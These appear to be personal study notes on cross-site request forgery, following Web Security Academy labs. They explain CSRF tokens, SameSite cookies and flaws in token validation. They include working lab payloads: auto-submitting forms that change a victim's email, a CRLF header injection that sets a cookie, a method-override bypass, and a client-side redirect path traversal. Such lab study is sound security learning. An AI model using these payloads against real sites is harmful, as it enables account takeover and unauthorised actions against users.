CSRF - Cross-Site Request Forgery:

What is CSRF?:
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to 
perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, 
which is designed to prevent different websites from interfering with each other. 

How Does CSRF Works:
For example, suppose an application contains a function that lets the user change the email address on their account. 
When a user performs this action, they make an HTTP request like the following: 

POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
email=wiener@normal-user.com

 This meets the conditions required for CSRF:
    - The action of changing the email address on a user's account is of interest to an attacker. 
      Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.
    - The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to
      track user sessions.
    - The attacker can easily determine the values of the request parameters that are needed to perform the action.


With these conditions in place, the attacker can construct a web page containing the following HTML -
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

- LAB PAYLOAD:

<html>
    <body>
        <form action="https://0a3b00ca03adb56582e0013e000a008b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned1234@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

- PAYLOAD WITH CSRF: email=wiener66%40normal-user.net&csrf=v6nGltjOcTRrlbFgQch77aNrJsThCIve
- CARLOS: email=carlos1%40carlos-montoya.net&csrf=tNC52Iju5kFhxV2kMpYTiwgnJTwCO2RQ

- How to deliver CSRF exploit:
The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. 
Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. 
This might be done by feeding the user a link to the website, via an email or social media message. Or if the attack is placed into a 
popular website (for example, in a user comment), they might just wait for users to visit the website.

Note that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website. 
In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. 
In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this -
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> 

- Common Defenses Against CSRF:
 Nowadays, successfully finding and exploiting CSRF vulnerabilities often involves bypassing anti-CSRF measures 
 deployed by the target website, the victim's browser, or both. The most common defenses you'll encounter are as follows:

    - CSRF tokens - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application 
      and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include 
      the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.

    - SameSite cookies - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating 
      from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite 
      restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces Lax SameSite restrictions by default. 
      As this is the proposed standard, we expect other major browsers to adopt this behavior in future.

    - Referer-based validation - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, 
      normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.

- What is a CSRF Token:
A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. 
When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, 
the server will refuse to perform the requested action.
A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example: 

<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>

Submitting this form results in the following request -
==========================c=================================================================================================================================
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded
csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
==========================c=================================================================================================================================


When implemented correctly, CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid 
request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include 
it in the malicious request.

- Common flaws in CSRF token validation:

1) Validation of CSRF token depends on request method
Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack: 

==========================c=================================================================================================================================
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
==========================c=================================================================================================================================

2) Validation of CSRF token depends on token being present
Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass 
the validation and deliver a CSRF attack: 

==========================c=================================================================================================================================
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
email=pwned@evil-user.net
==========================c=================================================================================================================================

3) CSRF Token is not tied to the user session
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, 
the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that 
token to the victim user in their CSRF attack. 

4) CSRF token is tied to a non-session cookie
In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is 
used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for 
CSRF protection, which are not integrated together: 

==========================c=================================================================================================================================
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
==========================c=================================================================================================================================

This situation is harder to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie 
in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token 
and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the 
victim in their CSRF attack.

- Note:
The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application 
within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie 
that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to 
place a cookie that is submitted to secure.normal-website.com.

LAB SOLUTION:

this is the PAYLOAD - 

<html>
    <body>
        <form action="https://0a88004a04c58cd38446d92600320060.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="kkvv@evil-user.net" />
            <input required type="hidden" name="csrf" value="LyhF499do2Y3J3DSbW2zUDCcHjWkMwFx" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

this is the header added - 
Cookie: csrfKey=Ob5KdY8HP3M6XvXhQHshnY7PpS1cT016
Cookie: session=JIPV9B0PVdY90C6PaIIBGAtur1HiGq5s; csrfKey=Ob5KdY8HP3M6XvXhQHshnY7PpS1cT016
this should be instead the script tag, to inject the cookie to the victims browser - 
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

So basically we found out the the csrf token and csrfkey are tied together so we created a new account for ourselvs, tooks our own 
csrf token and csrftkey and added it to the payload which we created for the victim, when the victim will visit the html page, the page will
request the vulnerable app to change it's email and the request will contain our csrf token and csrf key which are valid for every user because
the web server is vulnerable for csrf.

5) CSRF token is simply duplicated in a cookie -
In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, 
but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies 
that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense 
against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state: 

==========================c=================================================================================================================================
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
==========================c=================================================================================================================================

In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't 
need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the 
cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 


Bypassing SameSite Cookie Restrictions:
SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. 
SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.
Since 2021, Chrome applies Lax SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. 
This is a proposed standard, and we expect other major browsers to adopt this behavior in the future. As a result, it's essential to have solid grasp of 
how these restrictions work, as well as how they can potentially be bypassed, in order to thoroughly test for cross-site attack vectors.
In this section, we'll first cover how the SameSite mechanism works and clarify some of the related terminology. We'll then look at some of the most 
common ways you may be able to bypass these restrictions, enabling CSRF and other cross-site attacks on websites that may initially appear secure. 

- What is a site in the context of SameSite cookies:
 In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like .com or .net, plus one 
 additional level of the domain name. This is often referred to as the TLD+1.
When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link 
from http://app.example.com to https://app.example.com is treated as cross-site by most browsers. 

- Whats the difference between a site and an origin:
The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. 
Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.
Two URLs are considered to have the same origin if they share the exact same scheme, domain name, and port. Although note that the port is often 
inferred from the scheme. 

As you can see from this example, the term "site" is much less specific as it only accounts for the scheme and last part of the domain name. 
Crucially, this means that a cross-origin request can still be same-site, but not the other way around.
Request from 	        Request to 	                 Same-site? 	       Same-origin?
https://example.com 	https://example.com 	     Yes 	               Yes
https://app.example.com https://intranet.example.com Yes 	               No: mismatched domain name
https://example.com 	https://example.com:8080 	 Yes 	               No: mismatched port
https://example.com 	https://example.co.uk 	     No: mismatched eTLD   No: mismatched domain name
https://example.com 	http://example.com 	         No: mismatched scheme No: mismatched scheme

This is an important distinction as it means that any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses 
on other domains belonging to the same site. We'll see an example of this in one of the labs later. 



How Does The SameSite Work?:
Before the SameSite mechanism was introduced, browsers sent cookies in every request to the domain that issued them, even if the request was triggered 
by an unrelated third-party website. SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include 
specific cookies. This can help to reduce users' exposure to CSRF attacks, which induce the victim's browser to issue a request that triggers a harmful 
action on the vulnerable website. As these requests typically require a cookie associated with the victim's authenticated session, the attack will fail 
if the browser doesn't include this.
All major browsers currently support the following SameSite restriction levels -
Strict
Lax
None

SameSite:None - 
If you encounter a cookie set with SameSite=None or with no explicit restrictions, it's worth investigating whether it's of any use. 
When the "Lax-by-default" behavior was first adopted by Chrome, this had the side-effect of breaking a lot of existing web functionality. 
As a quick workaround, some websites have opted to simply disable SameSite restrictions on all cookies, including potentially sensitive ones.
When setting a cookie with SameSite=None, the website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted 
messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.
==========================c=================================================================================================================================
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
==========================c=================================================================================================================================



- Bypassing SameSite Lax restrictions using GET requests:
In practice, servers aren't always fussy about whether they receive a GET or POST request to a given endpoint, even those that are expecting a form 
submission. If they also use Lax restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to 
perform a CSRF attack by eliciting a GET request from the victim's browser.
As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the 
simplest approaches to launching such an attack -

==========================c=================================================================================================================================
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
==========================c=================================================================================================================================

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, 
Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes - 

==========================c=================================================================================================================================
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
==========================c=================================================================================================================================


NOTE - Set-Cookie: session=d2Ty1pRVWWBtSdQIMvJt1izGN8GhBFZr; Expires=Sat, 06 Jul 2024 22:40:15 UTC; Secure; HttpOnly
notice that the Set-Cookie does not specify any SameSite restrictions, this means that by default the browser will use LAX.

NOTE - we can use in burp - right click > change the request method. - for example this will change a POST request with content in body,
to a GET request with params in url.

LAB PROGRESS FOR BYPASSING LAX COOKIE RESTRICTION:
they told us to try add in burp &_method=POST and set the original metho to GET, so this can bypass the method restriction, this is what we created - 

==========================c=================================================================================================================================
GET /my-account/change-email?email=wiener2%40normal-user.net&_method=POST HTTP/2
==========================c=================================================================================================================================

this is the original - 

==========================c=================================================================================================================================
POST /my-account/change-email?email=wiener2%40normal-user.net HTTP/2
==========================c=================================================================================================================================

this worked, so we crafted this html payload with same data/params/inputs etc etc

==========================c=================================================================================================================================
<html>
    <body>
        <form action="https://0a5c000804af04478278e72a00e0001b.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="_method" value="POST" />
            <input type="hidden" name="email" value="pwned0@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
==========================c=================================================================================================================================




Bypassing SameSite restrictions using on-site gadgets:

If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation 
if you can find a gadget that results in a secondary request within the same site.
One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. 
For some examples, see our materials on DOM-based open redirection.

As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, 
standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.
If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.
Note that the equivalent attack is not possible with server-side redirects. In this case, browsers recognize that the request to follow the redirect resulted 
from a cross-site request initially, so they still apply the appropriate cookie restrictions.


In My words, when we perform some POST request in the app, and then you can see (via proxy) that after your POST request there's another some kind of GET/POST request,
this means "Secondary Request".

LAB:

final payload - 
==========================c=================================================================================================================================
<html>
    <body>

        <script>
            document.location = "https://0adb005404097ec18063cbb200e200cb.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwn_pwned_!@pwn.pwn%26submit=1";
        </script>
    </body>
</html>
==========================c=================================================================================================================================

! Check out the full process of "Lab: SameSite Strict bypass via client-side redirect" in the CSRF_Lab_SameSite_Strict_bypass_via_client-side_redirect.notes document !




Bypassing SameSite restrictions via vulnerable sibling domains:

Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin.
Make sure you thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable you to elicit an arbitrary secondary 
request, such as XSS, can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.
In addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), 
which is essentially just a CSRF attack targeting a WebSocket handshake. For more details, see our topic on WebSocket vulnerabilities.